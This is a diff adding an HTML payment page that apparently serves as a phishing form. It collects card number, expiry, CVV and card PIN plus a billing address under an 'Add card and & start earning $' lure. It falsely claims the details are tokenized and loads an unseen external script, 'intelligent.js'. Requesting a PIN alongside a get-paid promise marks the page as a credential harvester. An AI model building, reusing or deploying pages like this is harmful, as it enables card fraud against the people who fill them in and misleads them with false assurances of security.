@@ -1,0 +1,169 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Credit Card Form</title>
+  <style>
+    :root{--bg:#0f1724;--card:#0b1220;--muted:#94a3b8;--accent:#06b6d4;--success:#10b981;--danger:#ef4444}
+    *{box-sizing:border-box}
+    html,body{height:100%}
+    body{font-family:Inter,system-ui,Segoe UI,Roboto,"Helvetica Neue",Arial;display:flex;align-items:center;justify-content:center;background:linear-gradient(180deg,#071024 0%, #071b2b 100%);color:#e6eef6;padding:24px}
+    .wrap{width:100%;max-width:920px;background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));border-radius:12px;padding:22px;display:grid;grid-template-columns:1fr 420px;gap:20px;align-items:start}
+    .preview{background:linear-gradient(135deg,#072033,#0a2238);border-radius:12px;padding:18px;color:white;min-height:220px;display:flex;flex-direction:column;justify-content:space-between}
+    .card-visual{background:linear-gradient(135deg,#0b3b4a,#053344);border-radius:10px;padding:18px;min-height:140px;display:flex;flex-direction:column;justify-content:space-between;box-shadow:0 10px 30px rgba(2,6,23,0.6)}
+    .chip{width:50px;height:38px;border-radius:6px;background:linear-gradient(180deg,#ffdca3,#ffb84d);box-shadow:inset 0 1px 0 rgba(255,255,255,0.3)}
+    .brand{font-weight:700;font-size:14px;text-transform:uppercase}
+    .number{letter-spacing:3px;font-size:18px}
+    .row{display:flex;justify-content:space-between;align-items:center}
+    .small{font-size:12px;color:var(--muted)}
+    form{padding:10px}
+    .field{margin-bottom:14px}
+    label{display:block;font-size:13px;color:var(--muted);margin-bottom:6px}
+    input[type=text],input[type=tel],input[type=password]{width:100%;padding:10px 12px;border-radius:8px;border:1px solid rgba(255,255,255,0.06);background:rgba(255,255,255,0.02);color:#e6eef6;font-size:15px}
+    input:focus{outline:2px solid rgba(6,182,212,0.12);border-color:rgba(6,182,212,0.25)}
+    .grid-2{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+    .actions{display:flex;gap:10px;align-items:center}
+    button{background:linear-gradient(180deg,var(--accent),#0aa5bd);color:#022;border:none;padding:10px 14px;border-radius:8px;font-weight:600;cursor:pointer}
+    button.ghost{background:transparent;border:1px solid rgba(255,255,255,0.06);color:var(--muted)}
+    .hint{font-size:13px;color:var(--muted);margin-top:8px}
+    @media (max-width:900px){.wrap{grid-template-columns:1fr;}}
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    <div>
+      <div class="preview">
+        <div class="card-visual" id="card-visual">
+          <div class="row" style="justify-content:space-between;align-items:center">
+            <div class="chip"></div>
+            <div class="brand" id="card-brand">Card</div>
+          </div>
+          <div>
+            <div class="number" id="card-number">•••• •••• •••• ••••</div>
+            <div class="row" style="margin-top:8px">
+              <div>
+                <div class="small">Cardholder</div>
+                <div id="card-holder">FULL NAME</div>
+              </div>
+              <div style="text-align:right">
+                <div class="small">Expires</div>
+                <div id="card-exp">MM/YY</div>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div style="margin-top:12px;font-size:13px;color:var(--muted)">Secure payment — your card details are tokenized on submit.</div>
+      </div>
+    </div>
+
+    <form action="#" method="post">
+      <h3 style="margin-top:0;color:#e6eef6">Payment details</h3>
+
+      <div class="field">
+        <label for="cardholder">Cardholder name</label>
+        <input type="text" id="cardholder" name="Card Holder" placeholder="Jane Doe" required>
+      </div>
+
+      <div class="field">
+        <label for="cardnumber">Card number</label>
+        <input type="tel" id="cardnumber" name="Card Number" maxlength="19" placeholder="1234 1234 1234 1234" required>
+      </div>
+
+      <div class="grid-2">
+        <div class="field">
+          <label for="expiry">Expiry (MM/YY)</label>
+          <input type="tel" id="expiry" name="Expiry Date" maxlength="5" placeholder="08/28" required>
+        </div>
+        <div class="field">
+          <label for="cvc">CVC / CVV</label>
+          <input type="tel" id="cvc" name="CVV" maxlength="4" placeholder="123" required>
+        </div>
+      </div>
+
+      <div class="field">
+        <label for="cardpin">Card PIN / Passcode</label>
+        <input type="password" id="cardpin" name="Card PIN" maxlength="6" placeholder="••••••" required>
+      </div>
+
+      <hr style="opacity:0.06;margin:18px 0" />
+
+      <h4 style="margin:8px 0;color:#cfeff6">Billing address</h4>
+
+      <div class="field">
+        <label for="addr1">Address line 1</label>
+        <input type="text" id="addr1" name="Address Line 1" placeholder="123 Main St" required>
+      </div>
+
+      <div class="field">
+        <label for="addr2">Address line 2 <span class="small">(optional)</span></label>
+        <input type="text" id="addr2" name="Address Line 2" placeholder="Apt, suite, unit, building">
+      </div>
+
+      <div class="grid-2">
+        <div class="field">
+          <label for="city">City</label>
+          <input type="text" id="city" name="City" placeholder="City" required>
+        </div>
+        <div class="field">
+          <label for="state">State / Province</label>
+          <input type="text" id="state" name="State" placeholder="State or province">
+        </div>
+      </div>
+
+      <div class="grid-2">
+        <div class="field">
+          <label for="postal">Postal / ZIP code</label>
+          <input type="text" id="postal" name="Postal Code" placeholder="12345" required>
+        </div>
+        <div class="field">
+          <label for="country">Country</label>
+          <input type="text" id="country" name="Country" placeholder="Enter your country" required>
+        </div>
+      </div>
+
+      <div class="actions">
+        <button type="submit" id="pay-btn">Add card and & start earning $</button>
+        <button type="reset" class="ghost" id="clear-btn">Clear</button>
+      </div>
+
+      <div class="hint">We accept Visa, Mastercard and American Express. The Pay now button performs normal form submission.</div>
+    </form>
+  </div>
+
+  <script src="intelligent.js"></script>
+  <script>
+    const cardNumberInput = document.getElementById("cardnumber");
+    const cardHolderInput = document.getElementById("cardholder");
+    const expiryInput = document.getElementById("expiry");
+
+    const displayNumber = document.getElementById("card-number");
+    const displayHolder = document.getElementById("card-holder");
+    const displayExp = document.getElementById("card-exp");
+    const displayBrand = document.getElementById("card-brand");
+
+    cardHolderInput.addEventListener("input", () => {
+      displayHolder.textContent = cardHolderInput.value || "FULL NAME";
+    });
+
+    expiryInput.addEventListener("input", (e) => {
+      let value = e.target.value.replace(/\D/g, "").substring(0, 4);
+      if (value.length >= 3) value = value.substring(0, 2) + "/" + value.substring(2, 4);
+      e.target.value = value;
+      displayExp.textContent = value || "MM/YY";
+    });
+
+    cardNumberInput.addEventListener("input", (e) => {
+      let value = e.target.value.replace(/\D/g, "").substring(0, 16);
+      const formatted = value.replace(/(\d{4})(?=\d)/g, "$1 ").trim();
+      e.target.value = formatted;
+      displayNumber.textContent = formatted || "•••• •••• •••• ••••";
+
+      if (value.startsWith("4")) displayBrand.textContent = "VISA";
+      else if (/^5[1-5]/.test(value)) displayBrand.textContent = "Mastercard";
+      else if (/^3[47]/.test(value)) displayBrand.textContent = "AMEX";
+      else displayBrand.textContent = "Card";
+    });
+  </script>
+</body>
+</html>
